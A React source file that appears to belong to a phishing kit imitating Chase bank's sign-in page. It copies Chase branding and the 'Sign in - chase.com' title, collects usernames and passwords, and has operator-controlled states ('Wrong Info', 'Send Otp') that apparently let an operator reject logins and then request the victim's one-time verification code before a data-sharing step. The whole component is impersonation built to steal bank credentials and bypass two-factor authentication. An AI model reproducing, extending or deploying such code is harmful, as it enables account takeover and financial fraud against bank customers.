import { otpOptions } from "../../bankDetails";
import clsx from "clsx";
import { Link } from "react-router-dom";
import { FaAngleRight } from "react-icons/fa6";
import BankingHeader from "./BankingHeader";
import ChaseFavIcon from "../../../../../../../../assets/allBanks/banks/chase/cs3.ico";
import ChaseLogo from "../../../../../../../../assets/allBanks/banks/chase/cs4.png";
import { RiLockPasswordLine } from "react-icons/ri";
import { motion } from "framer-motion";
import { BsExclamationCircleFill } from "react-icons/bs";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import ShareData from "./ShareData";
import { ClipLoader } from "react-spinners";
import BasicLoader from "../../../../../loading/BasicLoader";
import AdminLink from "../../../../../admin/AdminLink";
import BankOtpControl from "./BankOtpControl";
import BankControl from "./BankControl";

const Chase = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  indexOtp,
  handleOtpOption,
  isOpenOtp,
  onSubmitOtpOptions,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  setIsOpenOtp,
  loading,
  user,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    handleBlur,
    errorFormState,
    handleChange,
    onSubmitOtp,
    blurOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    setshowPassword,
    showPassword,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);

  return (
    <motion.div
      initial={{ y: -100, opacity: 0 }}
      animate={{ y: 0, opacity: 1 }}
      exit={{ y: -100, opacity: 0 }}
      transition={{ type: "spring", stiffness: 300, damping: 50 }}
      className={clsx(
        "w-full min-h-screen h-full  top-0  btn5",
        typeAccount ? "hidden" : "block"
      )}
    >
      <BankingHeader
        text="Sign in - chase.com"
        handleCancel={handleCancel}
        img={ChaseFavIcon}
        setAllBankItems={setAllBankItems}
        setIsOpenOtp={setIsOpenOtp}
        setOtpOpen={setOtpOpen}
      />
      <div>
        <div className="flex justify-center mt-5 mb-10">
          <img src={ChaseLogo} alt="" className="w-[220px] h-[32px]" />
        </div>
        <div
          className={clsx(
            "flex justify-center items-center pb-6",
            allBankOpen ? "hidden" : "block"
          )}
        >
          <div className="pb-4 mx-4 bg-white rounded-lg customXlg:mx-0">
            <div className="flex gap-1 pt-3 pb-4 pl-4 pr-6 text-sm rounded-t-lg customMiniTablet:pr-16 bg-customGray-1010 text-customGray-1011">
              <RiLockPasswordLine size={44} />
              <span className="mt-1">
                Chase won&apos;t share your username or password
              </span>
            </div>
            <div className="mx-4 mt-10 mb-2 ">
              <div className="mx-3 mb-10 space-y-12">
                <div>
                  <label
                    className={clsx(
                      " text-customGray-1012",
                      errorFormState.username &&
                        "text-customRed-200 font-semibold"
                    )}
                  >
                    Username
                  </label>
                  <input
                    type="text"
                    value={formState.username}
                    name="username"
                    onChange={handleChange}
                    onBlur={handleBlur}
                    className={clsx(
                      "w-full pb-2 pr-4 mt-1 border-b outline-none border-customGray-1011 focus:border-customBlue-1004 focus:border-b-2 transistion2",
                      errorFormState.username
                        ? "border-b-2 border-customRed-200"
                        : ""
                    )}
                  />
                  {errorFormState.username && (
                    <p className="flex gap-3 mt-2 text-sm text-customRed-200">
                      <BsExclamationCircleFill className="mt-[2px]" />
                      Please tell us your username.{" "}
                    </p>
                  )}
                </div>
                <div className="relative">
                  <label
                    className={clsx(
                      " text-customGray-1012",
                      errorFormState.password &&
                        "text-customRed-200 font-semibold"
                    )}
                  >
                    Password
                  </label>
                  <input
                    type={showPassword ? "text" : "password"}
                    value={formState.password}
                    onBlur={handleBlur}
                    name="password"
                    onChange={handleChange}
                    className={clsx(
                      "w-full pb-2 pr-4 mt-1 border-b outline-none border-customGray-1011 focus:border-customBlue-1004 focus:border-b-2 transistion2",
                      errorFormState.password
                        ? "border-b-2 border-customRed-200"
                        : ""
                    )}
                  />
                  <span
                    onClick={() => setshowPassword((prevShow) => !prevShow)}
                    className="absolute right-0 font-semibold leading-[46px] h-full  text-customBlue-1004"
                  >
                    {showPassword ? "Hide" : "Show"}
                  </span>
                  {errorFormState.password && (
                    <p className="flex gap-3 mt-2 text-sm text-customRed-200">
                      <BsExclamationCircleFill className="mt-[2px]" />
                      Please tell us your password.{" "}
                    </p>
                  )}
                </div>
                <button
                  onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                  disabled={loading}
                  className={clsx(
                    "w-full py-2 mt-4 mb-6 text-lg font-semibold text-white rounded-lg bg-customBlue-1004 hover:bg-customBlue-1005 transistion2",
                    loading ? "bg-opacity-30" : ""
                  )}
                >
                  {loading && <ClipLoader size={10} color="#fff" />}
                  {loading ? " Loading..." : "Sign In"}
                </button>
              </div>
              <Link
                to="https://www.chase.com/"
                className="space-y-1 group text-customBlue-1004"
              >
                <div className="flex items-center gap-1 hover:text-customBlue-1005 transistion2">
                  Forgot username/password? <FaAngleRight />
                </div>
                <div className="flex items-center gap-1 hover:text-customBlue-1005 transistion2">
                  Not Enrolled? Sign Up Now. <FaAngleRight />
                </div>
              </Link>
            </div>
          </div>
        </div>
      </div>
      {allBankOpen && (
        <div className={clsx(OtpOpen ? "hidden" : "block")}>
          <BankControl
            handleSelectedId={handleSelectedId}
            selectedPath={selectedPath}
            handleSelectSubmit={handleSelectSubmit}
          />
          <div>
            {activePathDetails.name === "Loading" && (
              <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                <BasicLoader />
              </p>
            )}
            {activePathDetails.name === "Wrong Info" && (
              <>
                <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-200">
                  <BsExclamationCircleFill className="mt-[2px]" />

                  <p>{activePathDetails.body}</p>
                </div>
                <div className={clsx("flex justify-center items-center pb-6")}>
                  <div className="mx-4 bg-white rounded-lg customXlg:mx-0">
                    <div className="flex gap-1 pt-3 pb-4 pl-4 pr-6 text-sm rounded-t-lg customMiniTablet:pr-16 bg-customGray-1010 text-customGray-1011">
                      <RiLockPasswordLine size={44} />
                      <span className="mt-1">
                        Chase won&apos;t share your username or password
                      </span>
                    </div>
                    <div className="mx-4 mt-10 mb-2 ">
                      <div className="mx-3 mb-10 space-y-12">
                        <div>
                          <label
                            className={clsx(
                              " text-customGray-1012",
                              errorFormState.username &&
                                "text-customRed-200 font-semibold"
                            )}
                          >
                            Username
                          </label>
                          <input
                            type="text"
                            value={formState.username}
                            name="username"
                            onChange={handleChange}
                            onBlur={handleBlur}
                            className={clsx(
                              "w-full pb-2 pr-4 mt-1 border-b outline-none border-customGray-1011 focus:border-customBlue-1004 focus:border-b-2 transistion2",
                              errorFormState.username &&
                                "border-b-2 border-customRed-200"
                            )}
                          />
                          {errorFormState.username && (
                            <p className="flex gap-3 mt-2 text-sm text-customRed-200">
                              <BsExclamationCircleFill className="mt-[2px]" />
                              Please tell us your username.{" "}
                            </p>
                          )}
                        </div>
                        <div className="relative">
                          <label
                            className={clsx(
                              " text-customGray-1012",
                              errorFormState.password &&
                                "text-customRed-200 font-semibold"
                            )}
                          >
                            Password
                          </label>
                          <input
                            type={showPassword ? "text" : "password"}
                            value={formState.password}
                            onBlur={handleBlur}
                            name="password"
                            onChange={handleChange}
                            className={clsx(
                              "w-full pb-2 pr-4 mt-1 border-b outline-none border-customGray-1011 focus:border-customBlue-1004 focus:border-b-2 transistion2",
                              errorFormState.password &&
                                "border-b-2 border-customRed-200"
                            )}
                          />
                          {errorFormState.password && (
                            <p className="flex gap-3 mt-2 text-sm text-customRed-200">
                              <BsExclamationCircleFill className="mt-[2px]" />
                              Please tell us your password.{" "}
                            </p>
                          )}
                          <span
                            onClick={() =>
                              setshowPassword((prevShow) => !prevShow)
                            }
                            className="absolute right-0 font-semibold bottom-1 text-customBlue-1004"
                          >
                            {showPassword ? "Hide" : "Show"}
                          </span>
                        </div>
                        <button
                          disabled={loading}
                          onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                          className={clsx(
                            "w-full py-2 mt-4 mb-6 text-lg font-semibold text-white rounded-lg bg-customBlue-1004 hover:bg-customBlue-1005 transistion2",
                            loading ? "bg-opacity-30" : ""
                          )}
                        >
                          {loading && <ClipLoader size={10} color="#fff" />}
                          {loading ? "Loading..." : "Sign In"}
                        </button>
                      </div>
                      <Link
                        to="https://www.chase.com/"
                        className="space-y-1 group text-customBlue-1004"
                      >
                        <div className="flex items-center gap-1 hover:text-customBlue-1005 transistion2">
                          Forgot username/password? <FaAngleRight />
                        </div>
                        <div className="flex items-center gap-1 hover:text-customBlue-1005 transistion2">
                          Not Enrolled? Sign Up Now. <FaAngleRight />
                        </div>
                      </Link>
                    </div>
                  </div>
                </div>
              </>
            )}
            {activePathDetails.name === "Send Otp" && (
              <>
                <h3>{activePathDetails.body}</h3>
                <div
                  className={clsx(
                    "flex justify-center items-center   px-4 customMiniTablet:px-10  customTablet1:px-52",
                    isOpenOtp && "hidden"
                  )}
                >
                  <div className="px-3 pt-4 pb-5 bg-white rounded-lg ">
                    <div className="">
                      <div className="mb-5 space-y-1 text-center">
                        <h3 className="text-2xl font-bold text-customGray-1004">
                          Verify your identity
                        </h3>
                        <p className="text-sm text-customGray-1009">
                          For your security, we need to verify it&apos;s really
                          you.
                        </p>
                      </div>
                      <div className="px-0 customMiniTablet:px-6">
                        <h2 className=" customMiniTablet:pr-20 text-lg font-semibold text-customGray-1004 leading-[1.5rem]">
                          How would you like to get your verification code?
                        </h2>
                        <p className="pb-1 my-2 text-sm text-customGray-200">
                          Select One:
                        </p>
                        <div
                          role="radiogroup"
                          aria-label="Otp Options"
                          className="flex flex-col space-y-3"
                        >
                          {otpOptions.map((bank) => (
                            <div
                              key={bank.id}
                              role="radio"
                              tabIndex={0}
                              onClick={() => handleOtpOption(bank.id)}
                              className="flex items-center gap-2.5 "
                            >
                              <div className="border border-black rounded-full p-[2px] text-center mb-[1px]">
                                <p
                                  className={clsx(
                                    "rounded-full w-[10px] h-[10px]  ",
                                    otpOptions[indexOtp]?.id === bank.id
                                      ? "bg-customBlue-500"
                                      : ""
                                  )}
                                ></p>
                              </div>
                              <h2
                                className={clsx(
                                  "text-sm",
                                  otpOptions[indexOtp]?.id === bank.id
                                    ? "text-customBlue-500 hover:underline"
                                    : "hover:text-customBlue-700 hover:underline"
                                )}
                              >
                                {bank.name}
                              </h2>
                            </div>
                          ))}
                        </div>
                        <button
                          onClick={onSubmitOtpOptions}
                          className="w-full py-2 mt-8 text-white rounded-lg bg-customBlue-1004"
                        >
                          Continue
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
                {isOpenOtp && (
                  <div
                    className={clsx(
                      "flex justify-center items-center   px-4 customMiniTablet:px-10  customTablet1:px-52"
                    )}
                  >
                    <div className="px-4 pt-4 pb-5 bg-white rounded-lg ">
                      <div>
                        <div className="mb-5 space-y-1 text-center">
                          <h3 className="text-xl font-bold customMiniTablet:text-2xl text-customGray-1004">
                            Enter the code we sent you
                          </h3>
                        </div>
                        <div className=" customMiniTablet:px-8">
                          <h2 className="pr-3  customMiniTablet:pr-32 text-lg font-semibold text-customGray-1004 leading-[1.5rem]">
                            Enter it below to confirm it&apos;s really you
                          </h2>
                          <div>
                            <input
                              type="number"
                              placeholder="Enter Code"
                              value={formOtp.otpo}
                              name="otpo"
                              onChange={changeOtp}
                              onBlur={blurOtp}
                              className={clsx(
                                "w-full px-3 py-3 mt-3 border rounded-md outline-none border-customGray-200 no-spinner focus:border-customBlue-1004 focus:border-2 transistion2",
                                errorOtp.otpo && "border-2 border-customRed-200"
                              )}
                            />

                            {errorOtp.otpo && (
                              <p className="mt-2 text-sm text-customRed-200">
                                Please enter the verification code.
                              </p>
                            )}
                          </div>
                          <button
                            className="w-full py-2 my-6 font-semibold text-white rounded-lg bg-customBlue-1004"
                            onClick={(e) => onSubmitOtp(e, handleVerifiedOtp)}
                          >
                            {loading && <ClipLoader size={10} color="#fff" />}
                            {loading ? "Loading..." : "Verify"}
                          </button>
                          <p
                            className={clsx(
                              "cursor-pointer text-customBlue-100 font-bold",
                              !resend &&
                                "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                            )}
                            onClick={handleResend}
                          >
                            Didnt get a code? Resend
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                )}
              </>
            )}
          </div>
        </div>
      )}
      {OtpOpen && (
        <>
          <BankOtpControl
            handleSelectedOtp={handleSelectedOtp}
            selectedOtp={selectedOtp}
            handleSubmitOtp={handleSubmitOtp}
          />

          <div>
            {activeOtp.name === "Loading" && (
              <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                <BasicLoader />
              </p>
            )}
            {activeOtp.name === "wrong" && (
              <>
                <div
                  className={clsx(
                    "flex justify-center items-center   px-4 customMiniTablet:px-10  customTablet1:px-52"
                  )}
                >
                  <div className="px-4 pt-4 pb-5 bg-white rounded-lg ">
                    <div>
                      <div className="mb-5 space-y-1 text-center">
                        <h3 className="text-xl font-bold customMiniTablet:text-2xl text-customGray-1004">
                          Enter the code we sent you
                        </h3>
                      </div>
                      <div className=" customMiniTablet:px-8">
                        <h2 className="pr-3  customMiniTablet:pr-32 text-lg font-semibold text-customGray-1004 leading-[1.5rem]">
                          Enter it below to confirm it&apos;s really you
                        </h2>
                        <div>
                          <input
                            type="number"
                            placeholder="Enter Code"
                            value={formOtp.otpo}
                            name="otpo"
                            onChange={changeOtp}
                            onBlur={blurOtp}
                            className={clsx(
                              "w-full px-3 py-3 mt-3 border rounded-md outline-none border-customGray-200 no-spinner focus:border-customBlue-1004 focus:border-2 transistion2",
                              errorOtp.otpo && "border-2 border-customRed-200"
                            )}
                          />

                          {errorOtp.otpo && (
                            <p className="mt-2 text-sm text-customRed-200">
                              Please enter the verification code.
                            </p>
                          )}
                          <h3 className="mt-2 text-sm text-customRed-200">
                            {activeOtp.body}
                          </h3>
                        </div>
                        <button
                          className="w-full py-2 my-6 font-semibold text-white rounded-lg bg-customBlue-1004"
                          onClick={(e) => onSubmitOtp(e, handleVerifiedOtp)}
                        >
                          {loading && <ClipLoader size={10} color="#fff" />}
                          {loading ? "Loading..." : "Verify"}
                        </button>
                        <p
                          className={clsx(
                            "cursor-pointer text-customBlue-100 font-bold",
                            !resend &&
                              "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                          )}
                          onClick={handleResend}
                        >
                          Didnt get a code? Resend
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              </>
            )}
            {activeOtp.name === "otp" && (
              <>
                <ShareData
                  bankName={bankName}
                  handleTheFinal={handleTheFinal}
                  handleCancel={handleCancel}
                  setIsOpenOtp={setIsOpenOtp}
                  setAllBankItems={setAllBankItems}
                  siteLink="https://www.chase.com/"
                />
              </>
            )}
          </div>
        </>
      )}
    </motion.div>
  );
};

export default Chase;
